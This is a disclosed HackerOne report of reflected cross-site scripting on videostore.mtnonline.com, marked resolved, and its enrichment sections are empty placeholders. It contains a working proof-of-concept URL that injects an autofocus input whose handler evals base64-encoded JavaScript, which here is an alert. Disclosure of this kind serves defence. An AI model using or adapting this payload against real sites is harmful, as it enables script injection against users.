---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1244731'
original_report_id: '1244731'
title: XSS at videostore.mtnonline.com/GL/*.aspx via all parameters
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: mtn_group
created_at: '2021-06-26T00:02:26.041Z'
disclosed_at: '2022-05-01T21:20:58.456Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 4
asset_identifier: mtnonline.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# XSS at videostore.mtnonline.com/GL/*.aspx via all parameters

## Metadata

- HackerOne Report ID: 1244731
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: mtn_group
- Disclosed At: 2022-05-01T21:20:58.456Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

PoC
```
https://videostore.mtnonline.com/GL/MyAccount.aspx?PId=126&CID=5&OprId=11%27><input%20onfocus=eval(atob(%27YWxlcnQoJ1hTUycp%27))%20autofocus>
```

Symbols <"/'> are not filtered that alloweds to inject HTML code.
{F1353609}

## Impact

XSS at videostore.mtnonline.com

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
